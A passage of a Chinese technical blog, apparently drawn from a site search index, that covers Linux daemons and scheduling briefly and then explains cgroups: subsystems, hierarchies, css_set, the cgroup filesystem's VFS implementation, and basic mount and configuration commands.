&lt;p&gt;守护进程(daemon)是一个在后台运行的进程，不会连接到任何控制终端。它们常常在系统引导装入时启动，仅在系统关闭时才终止。UNIX系统有很多守护进程，守护进程程序的名称通常以字母“d”结尾：例如，syslogd 就是指管理系统日志的守护进程。通过ps进程查看器 ps -efj 的输出实例，内核守护进程的名字出现在方括号中，大致输出如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;UID         PID   PPID   PGID    SID  C STIME TTY          TIME CMD           
root          1      0      1      1  0 10:29 ?        00:00:02 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
root          2      0      0      0  0 10:29 ?        00:00:00 [kthreadd]
root          4      2      0      0  0 10:29 ?        00:00:00 [kworker/0:0H]
root          6      2      0      0  0 10:29 ?        00:00:00 [ksoftirqd/0]
root          7      2      0      0  0 10:29 ?        00:00:00 [migration/0]
root          8      2      0      0  0 10:29 ?        00:00:00 [rcu_bh]
root          9      2      0      0  0 10:29 ?        00:00:01 [rcu_sched]
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;用户态的守护进程的父进程是init进程，内核态守护进程的父进程并非是init进程，&lt;/p&gt;
&lt;p&gt;systemd：https://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html&lt;/p&gt;
&lt;h2 id=&#34;进程的调度&#34;&gt;进程的调度&lt;/h2&gt;
&lt;p&gt;linux进程的切换时通过__schedule函数完成。&lt;/p&gt;
&lt;p&gt;其实调度就是找一个已有的进程，然后进行上下文切换，并让它执行而已。&lt;/p&gt;
&lt;h2 id=&#34;线程&#34;&gt;线程&lt;/h2&gt;
">【linux】进程管理</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/cgroups/"" data-c="
          &lt;h2 id=&#34;基本原理&#34;&gt;基本原理&lt;/h2&gt;
&lt;p&gt;cgroup是Linux内核的一个特性，主要用来对共享资源进行隔离、限制、审计等。通过cgroup可以将定额的资源分配给特定的一组进程。&lt;/p&gt;
&lt;p&gt;默认情况下，编译内核时打开cgroup的系统中所有进程位于同一个cgroup，就是根，这个cgroup享有所有的系统资源。&lt;/p&gt;
&lt;p&gt;可以通过cgroup文件系统建立一个新的cgroup，然后配置这个新的cgroup，配置的内容包括为其分配进程、分配资源等。这个创建和分配的所有过程都是cgroup文件系统通过&lt;code&gt;shell echo&lt;/code&gt;写进文件完成的。&lt;/p&gt;
&lt;p&gt;cgroup本身是分层的，一个根层下面就像一棵树一样可以分很多层。每一层的cgroup文件系统目录下都有该层对应的资源配置文件。这些可以配置的资源都是cgroup子系统。&lt;/p&gt;
&lt;p&gt;子系统(subsystem)实际上是cgroup对进程组进行资源控制的具体体现。子系统具有多种类型，每个类型的子系统都代表一种系统资源，比如&lt;code&gt;CPU、memory&lt;/code&gt;等。当创建一个cgroup实例时，必须至少指定一种子系统。也就是说，这个新建的进程组在访问子系统对应的系统资源时就有了一些限制。具体的限制项与子系统的类型有关。&lt;/p&gt;
&lt;p&gt;cgroup中进程组的层级关系与Linux中进程的层级关系比较类似。在Linux操作系统中，一个进程通过&lt;code&gt;fork()&lt;/code&gt;系统调用创建了一个子进程，这两个进程之间存在父子这样的等级关系，并且子进程可以继承父进程的一些资源。系统中所有的进程形成一个树形的等级关系，每个进程都唯一的位于进程树中的某一个位置。&lt;/p&gt;
&lt;p&gt;对于cgroup来说，cgroup实例之间也是有具体级别关系的，但是它们层级关系是为了更细粒度的对进程组进行资源控制。同时，子cgroup会继承父cgroup的对资源的控制属性。&lt;/p&gt;
&lt;h3 id=&#34;子系统与层级关系&#34;&gt;子系统与层级关系&lt;/h3&gt;
&lt;p&gt;一个子系统就是一个资源控制器。cgroup九个子系统分别是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cpu&lt;/code&gt; 子系统，主要限制进程的 cpu 使用率。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cpuacct&lt;/code&gt; 子系统，可以统计 cgroup 中的进程的 cpu 使用报告。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cpuset&lt;/code&gt; 子系统，可以为 cgroup 中的进程分配单独的 cpu 节点或者内存节点。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;memory&lt;/code&gt; 子系统，可以限制进程的 memory 使用量。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;blkio&lt;/code&gt; 子系统，可以限制进程的块设备 io。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;devices&lt;/code&gt; 子系统，可以控制进程能够访问某些设备。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net_cls&lt;/code&gt; 子系统，可以标记 cgroup 中进程的网络数据包，然后可以使用tc 模块（traffic control）对数据包进行控制。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;freezer&lt;/code&gt; 子系统，可以挂起或者恢复 cgroup 中的进程。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ns&lt;/code&gt; 子系统，可以使不同 cgroup 下面的进程使用不同的 namespace。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;内核使用 cgroup 结构体来表示一个 control group 对某一个或者某几个 cgroup 子系统的资源限制。cgroup 结构体可以组织成一颗树的形式，每一棵cgroup 结构体组成的树称之为一个 cgroup 层级结构。&lt;/p&gt;
&lt;p&gt;cgroup层级结构可以 attach 一个或者几个 cgroup子系统，当前层级结构可以对其 attach 的 cgroup 子系统进行资源的限制。每一个 cgroup子系统只能被attach到一个 cpu 层级结构中。&lt;/p&gt;
&lt;p&gt;当建立第一个cgroup时，系统会把所有的进程都放进去，对应树形结构的树根，例如&lt;code&gt;cat /sys/fs/cgroup/cpu/task&lt;/code&gt;会输出所有进程的pid。&lt;/p&gt;
&lt;p&gt;如果在下级cgroup，例如/cgroup/test的&lt;code&gt;task&lt;/code&gt;中将一个进程的PID &lt;code&gt;echo&lt;/code&gt;到文件，就会发现这个进程并没有从上层cgroup的&lt;code&gt;task&lt;/code&gt;列表中消失 ，而是同时出现在了下层test cgroup的&lt;code&gt;task&lt;/code&gt;文件中，这就表示该进程现在归test cgroup控制。但由于test cgroup是下层 cgroup ，所以进程依然存在于上cgroup，而同层的 cgroup 之间却不能含有相同的进程。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下图时一个cgroup结构图，包含两个层级，即第一层级&lt;code&gt;cpu_mem&lt;/code&gt;和第二层级&lt;code&gt;cpuset_net&lt;/code&gt;。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1621935085460.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol&gt;
&lt;li&gt;系统中第一个被创建的cgroup被称为&lt;code&gt;root cgroup&lt;/code&gt;，该cgroup的成员包含系统中所有的进程。其下又包含从&lt;code&gt;cgroup1&lt;/code&gt;和&lt;code&gt;cgroup2&lt;/code&gt;两个cgroup，位于第二层级&lt;code&gt;cpuset_net&lt;/code&gt;中。&lt;/li&gt;
&lt;li&gt;一个子系统只能位于一个层级中。在图中，&lt;code&gt;cpu&lt;/code&gt;子系统位于第一层级&lt;code&gt;cpu_mem&lt;/code&gt;中，那么这个子系统将不能再位于第二层级中。不过第二层级会继承第一层级的cpu子系统。&lt;/li&gt;
&lt;li&gt;每个层级中可以关联多个子系统。第一层级关联了&lt;code&gt;cpu&lt;/code&gt;和&lt;code&gt;memory&lt;/code&gt;子系统。&lt;/li&gt;
&lt;li&gt;一个进程可以位于不同层级的cgroup中。由于&lt;code&gt;root cgroup&lt;/code&gt;包含了系统中所有的进程，因此&lt;code&gt;cgroup2&lt;/code&gt;中的进程P也位于&lt;code&gt;root cgroup&lt;/code&gt;中。从资源控制角度来说，进程P所在的进程组在访问&lt;code&gt;cpu、memory&lt;/code&gt;和&lt;code&gt;net&lt;/code&gt;时会受到资源限制。&lt;/li&gt;
&lt;li&gt;一个进程创建了子进程后，该子进程默认为父进程所在的cgroup的成员。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在创建了 cgroup 层级结构中的节点（cgroup 结构体）之后，可以把进程加入到某一个节点的控制任务列表中，一个节点的控制列表中的所有进程都会受到当前节点的资源限制。同时某一个进程也可以被加入到不同的 cgroup 层级结构的节点中，因为不同的 cgroup 层级结构可以负责不同的系统资源。所以说进程和 cgroup 结构体是一个多对多的关系。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1621991742733.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;上面这个图从整体结构上描述了进程与 cgroup 之间的关系。最下面的&lt;code&gt;P&lt;/code&gt;代表一个进程。每一个进程的描述符中有一个指针指向了一个辅助数据结构&lt;code&gt;css_set(cgroup subsystem set)&lt;/code&gt;。 指向某一个&lt;code&gt;css_set&lt;/code&gt;的进程会被加入到当前&lt;code&gt;css_set&lt;/code&gt;的进程链表中。一个进程只能隶属于一个&lt;code&gt;css_set&lt;/code&gt;，一个&lt;code&gt;css_set&lt;/code&gt;可以包含多个进程，隶属于同一&lt;code&gt;css_set&lt;/code&gt;的进程受到同一个&lt;code&gt;css_set&lt;/code&gt;所关联的资源限制。&lt;/p&gt;
&lt;p&gt;上图中的&lt;code&gt;&amp;quot;M×N Linkage&amp;quot;&lt;/code&gt;说明的是&lt;code&gt;css_set&lt;/code&gt;通过辅助数据结构可以与 cgroup 节点进行多对多的关联。但是 cgroup 的实现不允许&lt;code&gt;css_set&lt;/code&gt;同时关联同一个cgroup层级结构下多个节点。 这是因为 cgroup 对同一种资源不允许有多个限制配置。&lt;/p&gt;
&lt;p&gt;一个&lt;code&gt;css_set&lt;/code&gt;关联多个 cgroup 层级结构的节点时，表明需要对当前&lt;code&gt;css_set&lt;/code&gt;下的进程进行多种资源的控制。而一个 cgroup 节点关联多个&lt;code&gt;css_set&lt;/code&gt;时，表明多个&lt;code&gt;css_set&lt;/code&gt;下的进程列表受到同一份资源的相同限制。&lt;/p&gt;
&lt;h3 id=&#34;vfs文件系统&#34;&gt;&lt;code&gt;VFS&lt;/code&gt;文件系统&lt;/h3&gt;
&lt;p&gt;cgroup需要提供接口给用户态，有两个选择，一个是提供系统调用，另一个是提供虚拟文件系统。cgroup选择个后者，它提供了一种名为cgroup的文件系统。&lt;/p&gt;
&lt;p&gt;VFS(Virtual File System) 是一个内核抽象层，能够隐藏具体文件系统的实现细节，从而给用户态进程提供一套统一的 API 接口。&lt;/p&gt;
&lt;p&gt;VFS 使用了一种通用文件系统的设计，具体的文件系统只要实现了 VFS 的设计接口，就能够注册到 VFS 中，从而使内核可以读写这种文件系统。&lt;/p&gt;
&lt;p&gt;这很像面向对象设计中的抽象类与子类之间的关系，抽象类负责对外接口的设计，子类负责具体的实现。其实，VFS本身就是用 c 语言实现的一套面向对象的接口。&lt;/p&gt;
&lt;p&gt;cgroup通过VFS向用户层提供接口，用户通过挂载，创建目录，读写文件的方式与cgroup交互。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;通用文件模型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;VFS 通用文件模型中包含以下四种元数据结构：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;超级块对象&lt;/strong&gt;(superblock object)，用于存放已经注册的文件系统的信息。比如ext2，ext3等这些基础的磁盘文件系统，还有用于读写socket的socket文件系统，以及当前的用于读写cgroup配置信息的 cgroup 文件系统等。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;索引节点对象&lt;/strong&gt;(inode object)，用于存放具体文件的信息。对于一般的磁盘文件系统而言，inode 节点中一般会存放文件在硬盘中的存储块等信息；对于socket文件系统，inode会存放socket的相关属性，而对于cgroup这样的特殊文件系统，inode会存放与 cgroup 节点相关的属性信息。这里面比较重要的一个部分是一个叫做 inode_operations 的结构体，这个结构体定义了在具体文件系统中创建文件，删除文件等的具体实现。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文件对象&lt;/strong&gt;(file object)，一个文件对象表示进程内打开的一个文件，文件对象是存放在进程的文件描述符表里面的。同样这个文件中比较重要的部分是一个叫 file_operations 的结构体，这个结构体描述了具体的文件系统的读写实现。当进程在某一个文件描述符上调用读写操作时，实际调用的是 file_operations 中定义的方法。 对于普通的磁盘文件系统，file_operations 中定义的就是普通的块设备读写操作；对于socket文件系统，file_operations 中定义的就是 socket 对应的 send/recv 等操作；而对于cgroup这样的特殊文件系统，file_operations 中定义的就是操作 cgroup 结构体等具体的实现。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;目录项对象&lt;/strong&gt;(dentry object)，在每个文件系统中，内核在查找某一个路径中的文件时，会为内核路径上的每一个分量都生成一个目录项对象，通过目录项对象能够找到对应的 inode 对象，目录项对象一般会被缓存，从而提高内核查找速度。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;cgroup文件系统的实现&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;基于VFS实现的文件系统，都必须实现VFS通用文件模型定义的这些对象，并实现这些对象定义的部分函数。cgroup文件系统也不例外。&lt;/p&gt;
&lt;p&gt;cgroup文件系统类型的结构体：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static struct file_system_type cgroup_fs_type = {
        .name = &amp;quot;cgroup&amp;quot;,
        .mount = cgroup_mount,
        .kill_sb = cgroup_kill_sb,
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里面两个函数分别代表安装和卸载某一个 cgroup 文件系统所需要执行的函数。每次把某一个 cgroup 子系统安装到某一个装载点的时候，cgroup_mount 方法就会被调用，这个方法会生成一个 cgroup_root（cgroup层级结构的根）并封装成超级快对象。&lt;/p&gt;
&lt;p&gt;cgroup超级块对象定义的操作：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static const struct super_operations cgroup_ops = {
        .statfs = simple_statfs,
        .drop_inode = generic_delete_inode,
        .show_options = cgroup_show_options,
        .remount_fs = cgroup_remount,
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里只有部分函数的实现，这是因为对于特定的文件系统而言，所支持的操作可能仅是 super_operations 中所定义操作的一个子集，比如说对于块设备上的文件对象，肯定是支持类似 fseek 的查找某个位置的操作，但是对于 socket 或者 cgroup 这样特殊的文件系统，就不支持这样的操作。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;inode&lt;/code&gt;对象和&lt;code&gt;file&lt;/code&gt;对象的定义的特殊实现函数：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static const struct inode_operations cgroup_dir_inode_operations = {
        .lookup = cgroup_lookup,
        .mkdir = cgroup_mkdir,
        .rmdir = cgroup_rmdir,
        .rename = cgroup_rename,
};
static const struct file_operations cgroup_file_operations = {
        .read = cgroup_file_read,
        .write = cgroup_file_write,
        .llseek = generic_file_llseek,
        .open = cgroup_file_open,
        .release = cgroup_file_release,
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从这些代码可以推断出，cgroup 通过实现 VFS 的通用文件系统模型，把维护 cgroup 层级结构的细节，隐藏在 cgroup 文件系统的这些实现函数中。&lt;/p&gt;
&lt;p&gt;从另一个方面说，用户在用户态对 cgroup 文件系统的操作，通过 VFS 转化为对 cgroup 层级结构的维护。通过这样的方式，内核把 cgroup 的功能暴露给了用户态的进程。&lt;/p&gt;
&lt;h2 id=&#34;简单用法及说明&#34;&gt;简单用法及说明&lt;/h2&gt;
&lt;h3 id=&#34;挂载cgoup文件系统&#34;&gt;挂载cgoup文件系统&lt;/h3&gt;
&lt;p&gt;和所有的文件系统一样，cgroup文件系统需要先挂载，通过&lt;code&gt;mount&lt;/code&gt;命令挂载 cgroup 文件系统，格式为:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mount -t cgroup -o subsystems name /cgroup/name&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其中&lt;code&gt;-t cgroup&lt;/code&gt;指定文件系统类型为cgroup类型，&lt;code&gt;-o subsystems&lt;/code&gt; 表示需要关联的cgroup子系统，可以用逗号隔开，表示同时挂载多个子系统，&lt;code&gt;name&lt;/code&gt;表示实例的名称，&lt;code&gt;/cgroup/name&lt;/code&gt; 表示挂载点，这条命令同时在内核中创建了一个cgroup 层级结构。(目前大多操作系统启动时已经默认挂载&lt;code&gt;/sys/fs/cgroup&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;比如挂载 &lt;code&gt;cpuset, cpu, cpuacct, memory&lt;/code&gt; 4个&lt;code&gt;subsystem&lt;/code&gt;到&lt;code&gt;/cgroup/cpu_and_mem&lt;/code&gt; 目录下，就可以使用 &lt;code&gt;mount -t cgroup -o remount,cpu,cpuset,memory cpu_and_mem /cgroup/cpu_and_mem&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;cgroup文件系统的一个特点是用户可以同时挂载多个cgroup文件系统，但是要保证每个cgroup文件系统用到的子系统没有重叠。也就是说，如果已经有一个cgroup文件系统的挂载包含了某一个子系统，其它cgroup文件系统就不能包含这个子系统。&lt;/p&gt;
&lt;p&gt;ubuntu和centos的做法是每个cgroup文件系统的挂载基本只包含一个子系统。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;ll /sys/fs/cgroup/
total 0
drwxr-xr-x. 2 root root  0 May 25 04:19 blkio
lrwxrwxrwx. 1 root root 11 May 25 04:19 cpu -&amp;gt; cpu,cpuacct
lrwxrwxrwx. 1 root root 11 May 25 04:19 cpuacct -&amp;gt; cpu,cpuacct
drwxr-xr-x. 3 root root  0 May 25 04:19 cpu,cpuacct
drwxr-xr-x. 2 root root  0 May 25 04:19 cpuset
drwxr-xr-x. 2 root root  0 May 25 04:19 devices
drwxr-xr-x. 2 root root  0 May 25 04:19 freezer
drwxr-xr-x. 2 root root  0 May 25 04:19 hugetlb
drwxr-xr-x. 2 root root  0 May 25 04:19 memory
lrwxrwxrwx. 1 root root 16 May 25 04:19 net_cls -&amp;gt; net_cls,net_prio
drwxr-xr-x. 2 root root  0 May 25 04:19 net_cls,net_prio
lrwxrwxrwx. 1 root root 16 May 25 04:19 net_prio -&amp;gt; net_cls,net_prio
drwxr-xr-x. 2 root root  0 May 25 04:19 perf_event
drwxr-xr-x. 2 root root  0 May 25 04:19 pids
drwxr-xr-x. 4 root root  0 May 25 04:19 systemd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以CPU子系统所在的cgroup文件系统为例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;ll /sys/fs/cgroup/cpu/
total 0
-rw-r--r--. 1 root root 0 May 25 04:19 cgroup.clone_children
--w--w--w-. 1 root root 0 May 25 04:19 cgroup.event_control
-rw-r--r--. 1 root root 0 May 25 04:19 cgroup.procs
-r--r--r--. 1 root root 0 May 25 04:19 cgroup.sane_behavior
-r--r--r--. 1 root root 0 May 25 04:19 cpuacct.stat
-rw-r--r--. 1 root root 0 May 25 04:19 cpuacct.usage
-r--r--r--. 1 root root 0 May 25 04:19 cpuacct.usage_percpu
drwxr-xr-x. 3 root root 0 May 25 04:52 cpu_c1
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.cfs_period_us
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.cfs_quota_us
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.rt_period_us
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.rt_runtime_us
-rw-r--r--. 1 root root 0 May 25 04:19 cpu.shares
-r--r--r--. 1 root root 0 May 25 04:19 cpu.stat
-rw-r--r--. 1 root root 0 May 25 04:19 notify_on_release
-rw-r--r--. 1 root root 0 May 25 04:19 release_agent
-rw-r--r--. 1 root root 0 May 25 04:19 tasks
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;总共包含的文件可以分为三类：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;目录。再cgroup文件系统中目录对应一个具体的cgroup。&lt;/li&gt;
&lt;li&gt;通用文件。以&lt;code&gt;cgroup.&lt;/code&gt;为前缀的文件和三个无前缀的文件&lt;code&gt;notify_on_release, release_agent, tasks&lt;/code&gt;，这些通用文件再每个cgroup文件系统都会出现，无论指定的是哪个子系统。&lt;/li&gt;
&lt;li&gt;子系统专有文件。这些文件是配置子系统的接口，子系统不同，文件也不同。例如上面的以&lt;code&gt;cpu.&lt;/code&gt;为前缀的文件。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在cgroup文件系统中，创建(删除)一个目录就是创建(删除)一个cgroup，创建完目录后，会自动产生很多文件，在cgroup文件系统的根目录下(在上面的例子中是&lt;code&gt;/sys/fs/cgroup/cpu&lt;/code&gt;)的大多数文件都会出现在cgroup文件系统的下级目录中，除了少数在代码实现中标记为只在根目录中出现的文件，例如&lt;code&gt;cgroup.sane_behavior&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;各个子系统的通用文件：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;cgroup.procs&lt;/code&gt;&lt;br&gt;
此文件的内容和cgroup中所有进程的进程号关联。这里的进程号实际上是线程组号(thread group ID)。向这个文件写入一个线程组号，就会把整个线程组中的线程都加入此文件所属的cgroup。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cgroup.clone_chidren&lt;/code&gt;&lt;br&gt;
这个文件和一个标志关联，而此标志只被&lt;code&gt;cpuset&lt;/code&gt;子系统使用。当此标志为1时，创建新的有关&lt;code&gt;cpuset&lt;/code&gt;的cgroup时，子cgroup从父cgroup中复制&lt;code&gt;cpuset&lt;/code&gt;配置。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cgroup.sane_behavior&lt;/code&gt;&lt;br&gt;
显示cgroup文件系统的&lt;code&gt;sane_behavior&lt;/code&gt;的状态。随着内核控制组子系统的开发，一些旧的做法不再合适，但是为了兼容旧的应用又不好完全清除。于是开发者提供了一个选项&lt;code&gt;__DEVEL__sane_behavior&lt;/code&gt;，供挂载时使用。如果有这个挂载选项，老旧的不合适的代码逻辑就不会出现，&lt;code&gt;tasks、notify_on_release、release_agent&lt;/code&gt; 这三个文件也不会出现。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;tasks&lt;/code&gt;&lt;br&gt;
旧机制，尽量不要使用。此文件关联控制组中所有线程的线程号。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;notify_on_release&lt;/code&gt;&lt;br&gt;
旧机制，尽量不要使用。通过它来存取 &lt;code&gt;notify_on_release&lt;/code&gt; 标志。当此标志为 1 时，在 cgroup退出时，内核要通知用户态。所谓退出是指此 cgroup 不再有进程，也不再有子 cgroup。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;release_agent&lt;/code&gt;&lt;br&gt;
旧机制，尽量不要使用。此文件中存有一个路径，当内核需要通知用户态 cgroup 退出事件时，内核运行此路径所指的可执行文件。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;子节点和进程&#34;&gt;子节点和进程&lt;/h3&gt;
&lt;p&gt;挂载某一个cgroup子系统到挂载点之后，就可以通过在挂载点下面建立文件夹创建cgroup层级结构中的节点，当创建完文件夹后，会自动在其中创建相关的配置文件。创建目录的动作也就是创建了下个层级的一个分支，还可以在这个目录中继续创建目录，形成第三层级。&lt;/p&gt;
&lt;p&gt;然后在相应的配置文件中写上具体的配置。例如在&lt;code&gt;cpu.shares&lt;/code&gt;中写入整数值可以控制该cgroup获得的时间片。&lt;/p&gt;
&lt;p&gt;创建并配置完节点后，将进程的pid写入子节点下面的task文件中即可。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# 在cpu层级创建一个新的cgroup节点
# 命名为cpu_c1
mkdir /cgroup/cpu/cpu_c1

# 设置`cpu.shares`文件
# 将cpu_c1目录下的cpu.shares文件值设为2048，这样在系统出现cpu争抢时
# 属于cpu_c1这个cgroup的进程占用资源是其它进程的2倍。
echo 2048 &amp;gt;&amp;gt; /cgroup/cpu/cpu_c1/cpu.shares

# 将进程加入到`cpu_c1`这个cgroup节点。
echo pid &amp;gt;&amp;gt; /cgroup/cpu/cpu_c1/tasks
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看已经挂载的cgroup&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;mount -t cgroup
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,xattr,release_agent=/usr/lib/systemd/systemd-cgroup-agent,name=systemd)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,cpuacct,cpu)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,blkio)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,net_prio,net_cls)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,perf_event)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,freezer)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,devices)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,pids)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,hugetlb)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,cpuset)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,seclabel,memory)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;源码分析&#34;&gt;源码分析&lt;/h2&gt;
&lt;p&gt;cgroup分为三个部分：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;描述子系统(subsys)和cgroup等对象、和它们的依附关系等数据结构；&lt;/li&gt;
&lt;li&gt;提供给用户空间的文件系统接口；&lt;/li&gt;
&lt;li&gt;各子系统。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;数据结构&#34;&gt;数据结构&lt;/h3&gt;
&lt;h4 id=&#34;任务task&#34;&gt;任务(task)&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;task&lt;/code&gt;对应linux中的进程，&lt;code&gt;task&lt;/code&gt;和&lt;code&gt;cgroup&lt;/code&gt;之间是多对多的关系，&lt;code&gt;cgroup&lt;/code&gt;和&lt;code&gt;subsys&lt;/code&gt;是一对多的关系，&lt;code&gt;task&lt;/code&gt;和&lt;code&gt;subsys&lt;/code&gt;也是多对多的关系(&lt;code&gt;task&lt;/code&gt;可以依附多个&lt;code&gt;cgroup&lt;/code&gt;，一个&lt;code&gt;cgroup&lt;/code&gt;可能依附了多个&lt;code&gt;subsys&lt;/code&gt;)。&lt;/p&gt;
&lt;p&gt;要描述这些关系不容易，如果&lt;code&gt;task&lt;/code&gt;通过各&lt;code&gt;cgroup&lt;/code&gt;来引用各&lt;code&gt;subsys&lt;/code&gt;再从&lt;code&gt;subsys&lt;/code&gt;获取到资源限制，这比较低效。但是从&lt;code&gt;task&lt;/code&gt;视角来看，每个&lt;code&gt;task&lt;/code&gt;受到各个子系统的限制的是一定的，&lt;strong&gt;内核用&lt;code&gt;css_set&lt;/code&gt;来描述多个&lt;code&gt;subsys&lt;/code&gt;的组合，&lt;code&gt;task&lt;/code&gt;通过&lt;code&gt;css_set&lt;/code&gt;知道它受哪些限制&lt;/strong&gt;，加快了访问速度，而且&lt;code&gt;subsys&lt;/code&gt;组合是有限的，减少了内核数据结构的复杂度。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;css_set&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;看&lt;code&gt;css_set&lt;/code&gt;结构体，&lt;code&gt;css_set&lt;/code&gt;表示一种资源限制的集合(比如&lt;code&gt;cpu 20% mem 40%&lt;/code&gt;和&lt;code&gt;cpu 30% mem 20%&lt;/code&gt;是不同的资源限制，用不同的css_set)并且连接进程和subsys。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// include/linux/cgroup.h 
struct css_set { 
… 
    // 引用此css_set的进程链表
    struct list_head tasks;
    // 关联的cgroup链表，通过cg_cgroup_link结构体来连接
    struct list_head cgrp_links; 
    // cg_links用于链接所有关于此css_set的cgroup，cgroup并不是直接连接到此list_head，而是通过cg_cgroup_link结构体连接。

    //用于引用到css_set里具体的subsys,每个subsys在这里都有个元素，
    struct cgroup_subsys_state *subsys[CGROUP_SUBSYS_COUNT];
… 
}; 
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;进程结构体&lt;code&gt;task_struct&lt;/code&gt;：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// include/linux/sched.h 
struct task_struct { 
… 
#ifdef CONFIG_cgroup 
    // 该进程关联的css_set
    struct css_set __rcu *cgroup; 
    // 链接到关联此css_set的task链表
    struct list_head cg_list; 
#endif 
… 
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;task可以通过task_struct-&amp;gt;css_set-&amp;gt;subsys-&amp;gt;cgroup找到该task所依附的cgroup。&lt;/p&gt;
&lt;h3 id=&#34;cgroup&#34;&gt;cgroup&lt;/h3&gt;
